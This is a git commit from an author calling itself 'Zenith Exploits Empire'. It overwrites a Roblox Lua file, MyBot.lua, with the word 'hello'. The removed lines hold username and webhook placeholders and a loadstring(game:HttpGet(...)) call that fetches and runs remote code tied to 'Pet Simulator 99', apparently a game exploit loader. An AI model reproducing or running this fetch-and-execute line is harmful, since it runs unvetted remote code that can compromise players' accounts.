a13efc7bb5dd1ad807f2516084c2ec04c4b721f7
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 16:36:15 +0200

    Overwrite MyBot.lua

--- scripts/MyBot.lua
+++ scripts/MyBot.lua
@@ -1,5 +1,1 @@
-Username = "hi"
-Username2 = "hi"
-Webhook = "dssvx.com"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
+hello
